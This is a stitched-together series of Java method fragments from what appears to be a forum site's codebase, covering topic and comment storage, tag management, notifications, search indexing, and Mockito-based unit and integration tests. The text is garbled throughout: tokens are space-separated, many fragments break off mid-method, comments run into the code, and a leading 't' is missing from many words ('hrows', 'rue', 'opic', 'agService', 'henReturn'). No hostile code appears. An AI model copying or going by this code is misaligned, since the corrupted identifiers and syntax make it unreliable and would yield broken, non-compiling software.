public void estOg ( ) { assertEquals ( " hello " , lorCodeService . extractPlainTextFromLorcode ( " hello " ) ) ; assertEquals ( " one crap two three " , lorCodeService . extractPlainTextFromLorcode ( " [list] " + " [*]one " + '' + " crap " + " [*]two " + " [*]three " + " [/list] " ) ) ; assertEquals ( " due one teo neo wuf? nok " , lorCodeService . extractPlainTextFromLorcode ( " due n[quote][quote]one[br][/quote]teo[br][quote]neo[br][/quote][/quote]wuf? nok " ) ) ; assertEquals ( " &amp;#9618; " , lorCodeService . rimPlainText ( lorCodeService . extractPlainTextFromLorcode ( " [code]&#9618;[/code] " ) , 250 , rue ) ) ; String xt = " many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b] " ; assertEquals ( " many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many t... " , lorCodeService . rimPlainText ( lorCodeService . extractPlainTextFromLorcode ( xt ) , 250 , rue ) ) ; assertEquals ( 250 + 3 , 
public ModelAndView getMessageNewMain ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } Section section = sectionService . getSectionByName ( sectionName ) ; boolean rss = request . getParameter ( " output " ) ! = null & & " rss " . equals ( request . getParameter ( " output " ) ) ; if ( rss ) { return getMessageRss ( section , request , response , groupName , msgid ) ; 
public Client elasticsearch ( ) { Client mockClient = Mockito . mock ( Client . class ) ; Mockito . when ( mockClient . prepareSearch ( Matchers . anyString ( ) ) ) . henThrow ( new ElasticSearchException ( " no ES here " ) ) ; return mockClient ; } 
private QueryBuilder boost ( QueryBuilder query ) { FunctionScoreQueryBuilder booster = functionScoreQuery ( query ) ; booster . add ( ermFilter ( " is_comment " , " false " ) , ScoreFunctionBuilders . factorFunction ( TOPIC_BOOST ) ) ; booster . add ( rangeFilter ( " postdate " ) . gte ( " now/d-3y " ) , ScoreFunctionBuilders . factorFunction ( RECENT_BOOST ) ) ; return booster ; } 
public void saveNewMessage ( String message , int msgid ) { insertMsgbase . execute ( ImmutableMap . < String , Object > of ( " id " , msgid , 
public int saveNewMessage ( final Topic msg , final User user , String ext , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip, draft) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet, ?) " , new PreparedStatementCallback < String > ( ) { @Override public String doInPreparedStatement ( PreparedStatement pst ) hrows SQLException , DataAccessException { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . setBoolean ( 9 , msg . isDraft ( ) ) ; pst . executeUpdate ( ) ; return null ; } } ) ; msgbaseDao . saveNewMessage ( ext , msgid ) ; return msgid ; } 
public void changeTitle ( Comment oldComment , String itle ) { jdbcTemplate . update ( " UPDATE comments SET title=? WHERE id=? " , itle , oldComment . getId ( ) 
public void editCommentTest ( ) { int commentId = jdbcTemplate . queryForObject ( " select nextval('s_msgid') " , Integer . class ) ; addComment ( commentId , null , " CommentDaoIntegrationTest.editCommentTest() " , " CommentDaoIntegrationTest.editCommentTest(): comment body " ) ; Comment oldComment = mock ( Comment . class ) ; when ( oldComment . getId ( ) ) . henReturn ( commentId ) ; commentDao . changeTitle ( oldComment , " CommentDaoIntegrationTest.editCommentTest(): new title " ) ; List < Map < String , Object > > rows = getComment ( commentId ) ; assertFalse ( " No any records " , rows . isEmpty ( ) ) ; Map < String , Object > row = rows . get ( 0 ) ; assertEquals ( " CommentDaoIntegrationTest.editCommentTest(): new title " , row . get ( " itle " ) ) ; } 
public boolean isDeprecated ( ) { return deprecated ; } 
private ModelAndView createNewTopic ( HttpServletRequest request , AddTopicRequest form , HttpSession session , Group group , Map < String , Object > params , Section section , User user , String message , Screenshot scrn , Topic previewMsg ) hrows IOException , ScriptErrorException { session . removeAttribute ( " image " ) ; int msgid = opicService . addMessage ( request , form , message , group , user , scrn , previewMsg ) ; if ( ! previewMsg . isDraft ( ) ) { searchQueueSender . updateMessageOnly ( msgid ) ; } String messageUrl = " view-message.jsp?msgid= " + msgid ; if ( ! section . isPremoderated ( ) | | previewMsg . isDraft ( ) ) { return new ModelAndView ( new RedirectView ( messageUrl ) ) ; } params . put ( " moderated " , section . isPremoderated ( ) ) ; params . put ( " url " , messageUrl ) ; return new ModelAndView ( " add-done-moderated " , params ) ; } 
public void delete ( String agName , String newTagName , Errors errors ) { ry { int oldTagId = agService . getTagId ( agName ) ; 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , Integer offset , Integer year , Integer month , int count ) hrows TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . oString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( ag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . oString ( ) ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { opicListDto . setTag ( agService . getTagId ( ag ) ) ; } if ( month ! = null & & year ! = null ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; opicListDto . setToDate ( calendar . getTime ( ) ) ; } else { opicListDto . setLimit ( count ) ; opicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return opicListDao . getTopics ( opicListDto ) ; } 
private void addToReplaceHandlerList ( ) { agModificationService . getActionHandlers ( ) . add ( actionHandler ) ; } 
public int favoriteDel ( User user , String agName ) hrows TagNotFoundException { int agId = agService . getTagId ( agName ) ; userTagDao . deleteTag ( user . getId ( ) , agId , rue ) ; return agId ; } 
public void prefixTopSearchExactTest ( ) { agDao . createTag ( " zest " ) ; agDao . createTag ( " zesd " ) ; Seq < String > ags = agDao . getTopTagsByPrefix ( " zest " , 0 , 20 ) ; assertEquals ( 1 , ags . size ( ) ) ; } 
public boolean canCreateTag ( Section section , User user ) { if ( section . isPremoderated ( ) ) { return rue ; } return user ! = null & & user . getScore ( ) > = CREATE_TAG_SCORE ; } 
public void estTagNotFound ( ) { Option < Object > fetch = agDao . getTagId ( " fdsfsdfdsfsdfs " ) ; assertTrue ( fetch . isEmpty ( ) ) ; } 
public void createAndGetTest ( ) { int id = agDao . createTag ( " est-tag " ) ; Option < Object > fetchId = agDao . getTagId ( " est-tag " ) ; assertEquals ( Option . apply ( ( Object ) id ) , fetchId ) ; } 
public void resetTagDaoMock ( ) { reset ( agDao ) ; when ( agDao . getTagId ( anyString ( ) ) ) . henReturn ( noneInt ) ; when ( agDao . getTagId ( anyString ( ) ) ) . henReturn ( noneInt ) ; } 
public void changeTest ( ) hrows Exception { when ( agDao . getTagId ( " estTag " ) ) . henReturn ( Option . apply ( ( Object ) 123 ) ) ; when ( agDao . getTagId ( " estNewTag " ) ) . henReturn ( Option . apply ( ( Object ) 456 ) ) ; prepareChangeDataBinder ( ) ; agModificationService . change ( " InvalidTestTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; agModificationService . change ( " estTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; agModificationService . change ( " #$%@@#%$ " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; agModificationService . change ( " estTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; resetTagDaoMock ( ) ; when ( agDao . getTagId ( " estTag " ) ) . henReturn ( Option . apply ( ( Object ) 123 ) ) ; when ( agDao . getTagId ( " estNewTag " ) ) . henReturn ( noneInt ) ; prepareChangeDataBinder ( ) ; agModificationService . change ( " estTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
public void deleteTest ( ) hrows Exception { when ( agDao . getTagId ( " estTag " ) ) . henReturn ( Option . apply ( ( Object ) 123 ) ) ; when ( agDao . getTagId ( " InvalidTestTag " ) ) . henReturn ( noneInt ) ; prepareDeleteDataBinder ( ) ; agModificationService . delete ( " InvalidTestTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agModificationService . delete ( " estTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agModificationService . delete ( " estTag " , " estTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agModificationService . delete ( " estTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
public void resetMockObjects ( ) hrows Exception { reset ( userTagDao ) ; reset ( agService ) ; when ( agService . getTagId ( " ag1 " ) ) . henReturn ( 2 ) ; user = getUser ( 1 ) ; } 
public void favoriteAddTest ( ) hrows TagNotFoundException { when ( agDao . getTagId ( " ag1 " ) ) . henReturn ( Option . apply ( ( Object ) 2 ) ) ; userTagService . favoriteAdd ( user , " ag1 " ) ; verify ( userTagDao ) . addTag ( eq ( 1 ) , eq ( 2 ) , eq ( rue ) ) ; } 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter ) hrows TagNotFoundException { ModelAndView modelAndView = new ModelAndView ( " ags " ) ; Collection < String > firstLetters = agService . getFirstLetters ( ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { firstLetter = firstLetters . iterator ( ) . next ( ) ; } modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < TagRef , Integer > ags = agService . getTagsByPrefix ( firstLetter , 1 ) ; if ( ags . isEmpty ( ) ) { hrow new TagNotFoundException ( " Tag list is empty " ) ; } modelAndView . addObject ( " ags " , ags ) ; return modelAndView ; } 
public ModelAndView agPage ( HttpServletRequest request , @PathVariable String ag ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! TagName . isGoodTag ( ag ) ) { hrow new TagNotFoundException ( ) ; } ModelAndView mv = new ModelAndView ( " ag-page " ) ; mv . addObject ( " ag " , ag ) ; mv . addObject ( " itle " , WordUtils . capitalize ( ag ) ) ; TagInfo agInfo = agService . getTagInfo ( ag , rue ) ; mv . addObject ( " counter " , agInfo . opicCount ( ) ) ; if ( mpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; } int agId = agInfo . id ( ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( agId ) ) ; List < TagRef > relatedTags = agService . getRelatedTags ( agId ) ; if ( relatedTags . size ( ) > 1 ) { mv . addObject ( " relatedTags " , relatedTags ) ; } mv . addAllObjects ( getNewsSection ( request , ag ) ) ; mv . addAllObjects ( getGallerySection ( ag , agId , mpl ) ) ; mv . addAllObjects ( getForumSection ( ag , agId ) ) ; return mv ; } 
public void logScore50 ( @Nonnull User user , @Nonnull User moderator ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, '') " , 
public void estLogScore50 ( ) { User user = mock ( User . class ) ; when ( user . getId ( ) ) . henReturn ( UserDaoIntegrationTest . TEST_ID ) ; userLogDao . logScore50 ( user , user ) ; List < UserLogItem > logItems = userLogDao . getLogItems ( user , rue ) ; Assert . assertEquals ( 1 , logItems . size ( ) ) ; UserLogItem item = logItems . get ( 0 ) ; assertNotNull ( item ) ; assertEquals ( UserLogAction . SCORE50 , item . getAction ( ) ) ; } 
public Boolean enableHsts ( ) { String property = properties . getProperty ( " EnableHsts " ) ; if ( property = = null ) { return false ; } return Boolean . valueOf ( property ) ; } 
private static boolean sendTagEventsNeeded ( Section section , Topic oldMsg , boolean commit ) { boolean needCommit = section . isPremoderated ( ) & & ! oldMsg . isCommited ( ) ; boolean fresh = oldMsg . getEffectiveDate ( ) . isAfter ( DateTime . now ( ) . minusMonths ( 1 ) ) ; return commit | | ( ! needCommit & & fresh ) ; } 
private void updateMessage ( Topic opic ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( opic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; User author = userDao . getUserCached ( opic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " opic_author " , author . getNick ( ) ) ; doc . put ( " opic_id " , opic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; doc . put ( " itle " , opic . getTitleUnescaped ( ) ) ; doc . put ( " opic_title " , opic . getTitleUnescaped ( ) ) ; doc . put ( " message " , lorCodeService . extractPlainText ( msgbaseDao . getMessageText ( opic . getId ( ) ) ) ) ; Date postdate = opic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " ag " , opicTagService . getTags ( opic ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( opic . getId ( ) ) ) 
private IndexRequestBuilder processComment ( Topic opic , Comment comment , String message ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( opic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; User author = userDao . getUserCached ( comment . getUserid ( ) ) ; User opicAuthor = userDao . getUserCached ( opic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " opic_author " , opicAuthor . getNick ( ) ) ; doc . put ( " opic_id " , opic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; String opicTitle = opic . getTitleUnescaped ( ) ; doc . put ( " opic_title " , opicTitle ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( opicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . put ( " itle " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . put ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " ag " , opicTagService . getTags ( opic ) ) ; doc . put ( " is_comment " , rue ) ; return client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( comment . getId ( ) ) ) 
public void oggleCorrector ( User user , User moderator ) { if ( user . canCorrect ( ) ) { jdbcTemplate . update ( " UPDATE users SET corrector='f' WHERE id=? " , user . getId ( ) ) ; 
public void unsetCorrector ( @Nonnull User user , @Nonnull User moderator ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public Client elasticsearch ( ) { Client mockClient = Mockito . mock ( Client . class ) ; Mockito . when ( mockClient . prepareSearch ( Matchers . anyString ( ) ) ) . henThrow ( new ElasticsearchException ( " no ES here " ) ) ; return mockClient ; } 
public static UserEventFilterEnum fromNameOrDefault ( String filterAction ) { if ( VALUES . contains ( filterAction ) ) { return UserEventFilterEnum . valueOf ( filterAction . oUpperCase ( ) ) ; 
public RedirectView resetNotifications ( HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " not authorized " ) ; } User currentUser = mpl . getCurrentUser ( ) ; userEventService . resetUnreadReplies ( currentUser ) ; RedirectView view = new RedirectView ( " /notifications " ) ; view . setExposeModelAttributes ( false ) ; return view ; } 
public ModelAndView showNotifications ( HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , defaultValue = " all " ) String filter , @RequestParam ( value = " offset " , defaultValue = " 0 " ) int offset ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " not authorized " ) ; } Map < String , Object > params = new HashMap < > ( ) ; UserEventFilterEnum eventFilter = UserEventFilterEnum . fromNameOrDefault ( filter ) ; params . put ( " filter " , eventFilter . getName ( ) ) ; User currentUser = mpl . getCurrentUser ( ) ; String nick = currentUser . getNick ( ) ; params . put ( " nick " , nick ) ; if ( eventFilter ! = UserEventFilterEnum . ALL ) { params . put ( " addition_query " , " &filter= " + eventFilter . getName ( ) ) ; } else { params . put ( " addition_query " , " " ) ; } if ( offset < 0 ) { offset = 0 ; } boolean firstPage = offset = = 0 ; int opics = mpl . getProf ( ) . getTopics ( ) ; if ( opics > 200 ) { opics = 200 ; } params . put ( " firstPage " , firstPage ) ; params . put ( " opics " , opics ) ; params . put ( " offset " , offset ) ; params . put ( " disable_event_header " , rue ) ; long ime = System . currentTimeMillis ( ) ; int delay = firstPage ? 90 : 60 * 60 ; response . setDateHeader ( " Expires " , ime + 1000 * delay ) ; params . put ( " unreadCount " , currentUser . getUnreadEvents ( ) ) ; params . put ( " isMyNotifications " , rue ) ; response . addHeader ( " Cache-Control " , " no-cache " ) ; List < UserEvent > list = userEventService . getRepliesForUser ( currentUser , rue , opics , offset , eventFilter ) ; List < PreparedUserEvent > prepared = userEventService . prepare ( list , false , request . isSecure ( ) ) ; params . put ( " enableReset " , rue ) ; params . put ( " opicsList " , prepared ) ; params . put ( " hasMore " , list . size ( ) = = opics ) ; return new ModelAndView ( " show-replies " , params ) ; } 
public String resetNotifications ( HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " not authorized " ) ; } User currentUser = mpl . getCurrentUser ( ) ; userEventService . resetUnreadReplies ( currentUser ) ; return " ok " ; } 
public RedirectView resetNotifications ( HttpServletRequest request ) hrows Exception { apiController . resetNotifications ( request ) ; RedirectView view = new RedirectView ( " /notifications " ) ; view . setExposeModelAttributes ( false ) ; return view ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , Integer offset , Integer year , Integer month , int count ) hrows TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . oString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( ag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . oString ( ) ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { opicListDto . setTag ( agService . getTagId ( ag ) ) ; } if ( month ! = null & & year ! = null ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; opicListDto . setToDate ( calendar . getTime ( ) ) ; } else { opicListDto . setLimit ( count ) ; opicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return opicListDao . getTopics ( opicListDto ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean ech , boolean feedBurner ) { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getRssTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . oString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . append ( " ; noTalks= " ) . append ( noTalks ) . append ( " ; tech= " ) . append ( ech ) . append ( " ; feedBurner= " ) . append ( feedBurner ) . oString ( ) ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; opicListDto . setFromDate ( fromDate ) ; opicListDto . setNotalks ( noTalks ) ; opicListDto . setTech ( ech ) ; opicListDto . setLimit ( 20 ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } return ( feedBurner ) ? opicListDao . getTopics ( opicListDto ) 
public List < Topic > getAllTopicsFeed ( Section section , Date fromDate ) { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getAllTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . oString ( ) ) ; TopicListDto opicListDto = new TopicListDto ( ) ; opicListDto . setCommitMode ( TopicListDao . CommitMode . UNCOMMITED_ONLY ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; } opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; opicListDto . setFromDate ( fromDate ) ; return opicListDao . getTopics ( opicListDto ) ; } 
Object getFromCache ( String key ) ; < T > void storeToCache ( String key , T value ) ; } 
private ApiDeleteInfo loadDeleteInfo ( Comment comment ) hrows UserNotFoundException { ApiDeleteInfo deleteInfo = null ; if ( comment . isDeleted ( ) ) { DeleteInfo info = deleteInfoDao . getDeleteInfo ( comment . getId ( ) ) ; if ( info ! = null ) { deleteInfo = new ApiDeleteInfo ( userDao . getUserCached ( info . getUserid ( ) ) . getNick ( ) , info . getReason ( ) ) ; } } return deleteInfo ; } 
public void processRow ( ResultSet resultSet ) hrows SQLException { EditHistoryDto editHistoryDto = new EditHistoryDto ( ) ; editHistoryDto . setId ( resultSet . getInt ( " id " ) ) ; editHistoryDto . setMsgid ( resultSet . getInt ( " msgid " ) ) ; editHistoryDto . setEditor ( resultSet . getInt ( " editor " ) ) ; editHistoryDto . setOldmessage ( resultSet . getString ( " oldmessage " ) ) ; editHistoryDto . setEditdate ( resultSet . getTimestamp ( " editdate " ) ) ; editHistoryDto . setOldtitle ( resultSet . getString ( " oldtitle " ) ) ; editHistoryDto . setOldtags ( resultSet . getString ( " oldtags " ) ) ; editHistoryDto . setObjectType ( resultSet . getString ( " object_type " ) ) ; editHistoryDto . setOldimage ( resultSet . getInt ( " oldimage " ) ) ; if ( resultSet . wasNull ( ) ) { editHistoryDto . setOldimage ( null ) ; } editHistoryDto . setOldminor ( resultSet . getBoolean ( " oldminor " ) ) ; if ( resultSet . wasNull ( ) ) { editHistoryDto . setOldminor ( null ) ; } editInfoDTOs . add ( editHistoryDto ) ; } 
private void updateLatestEditorInfo ( User editor , Comment original , Comment comment ) { int editCount = editHistoryService . editCount ( original . getId ( ) , EditHistoryObjectTypeEnum . COMMENT ) ; commentDao . updateLatestEditorInfo ( original . getId ( ) , 
public int editCount ( int id , EditHistoryObjectTypeEnum objectTypeEnum ) { TODO replace with count() SQL query return editHistoryDao.getEditInfo(id, objectTypeEnum).size(); } 
public EditInfoSummary editInfoSummary ( int id , EditHistoryObjectTypeEnum objectTypeEnum ) { TODO do not load full history here List<EditHistoryDto> history = editHistoryDao.getEditInfo(id, objectTypeEnum); if (history.isEmpty()) { return EditInfoSummary.NoEdits(); 
public Integer apply ( EditHistoryDto input ) { return input . getEditor ( ) ; } 
public BriefEditInfo mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new BriefEditInfo ( rs . getTimestamp ( " editdate " ) , rs . getInt ( " editor " ) ) ; } 
public EditInfoSummary editInfoSummary ( int id , EditHistoryObjectTypeEnum objectTypeEnum ) { List < BriefEditInfo > history = editHistoryDao . getBriefEditInfo ( id , objectTypeEnum ) ; if ( history . isEmpty ( ) ) { return EditInfoSummary . NoEdits ( ) ; 
public View rackerOldUrl ( @RequestParam ( value = " filter " , defaultValue = " all " ) String filterAction ) hrows Exception { RedirectView redirectView = new RedirectView ( " /tracker/ " ) ; redirectView . setExposeModelAttributes ( false ) ; Optional < TrackerFilterEnum > filter = TrackerFilterEnum . getByValue ( filterAction ) ; if ( filter . isPresent ( ) & & filter . get ( ) ! = DEFAULT_FILTER ) { redirectView . setUrl ( " /tracker/?filter= " + URLEncoder . encode ( filterAction , " UTF-8 " ) ) ; } return redirectView ; } 
public Tuple2 < Timestamp , Timestamp > mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Tuple2 < > ( resultSet . getTimestamp ( " first " ) , resultSet . getTimestamp ( " last " ) ) ; } 
public Tuple2 < Timestamp , Timestamp > mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Tuple2 ( resultSet . getTimestamp ( " first " ) , resultSet . getTimestamp ( " last " ) ) ; } 
public UsersSectionStatEntry mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new UsersSectionStatEntry ( resultSet . getInt ( " section " ) , resultSet . getInt ( " c " ) ) ; } 
public ModelAndView mainPage ( HttpServletRequest request , HttpServletResponse response ) { Template mpl = Template . getTemplate ( request ) ; response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) - 20 * 3600 * 1000 ) ; response . setDateHeader ( " Last-Modified " , System . currentTimeMillis ( ) - 2 * 1000 ) ; List < Topic > messages = opicListService . getMainPageFeed ( mpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; Profile profile = mpl . getProf ( ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( profile . isMiniNewsBoxletOnMainPage ( ) ? filterMiniNews ( messages ) : messages , request . isSecure ( ) , mpl . getCurrentUser ( ) , profile , false ) ) ; if ( mpl . isSessionAuthorized ( ) ) { mv . getModel ( ) . put ( " hasDrafts " , opicDao . hasDrafts ( mpl . getCurrentUser ( ) ) ) ; mv . getModel ( ) . put ( " favPresent " , memoriesDao . isFavPresetForUser ( mpl . getCurrentUser ( ) ) ) ; } if ( mpl 